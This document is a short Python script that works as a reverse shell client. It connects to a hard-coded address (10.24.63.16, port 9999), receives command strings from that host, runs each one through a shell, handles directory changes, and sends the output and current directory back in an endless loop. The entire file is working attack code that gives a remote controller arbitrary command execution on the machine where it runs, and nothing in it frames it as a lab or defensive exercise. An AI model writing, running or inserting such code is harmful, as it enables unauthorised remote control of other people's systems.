import os
import socket
import subprocess

s = socket.socket()
host = '10.24.63.16'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        outputBytes = cmd.stdout.read() + cmd.stderr.read()
        outputStr = str(outputBytes,"utf-8")
        s.send(str.encode(outputStr + str(os.getcwd())+'>> '))
        print(outputStr)
s.close()
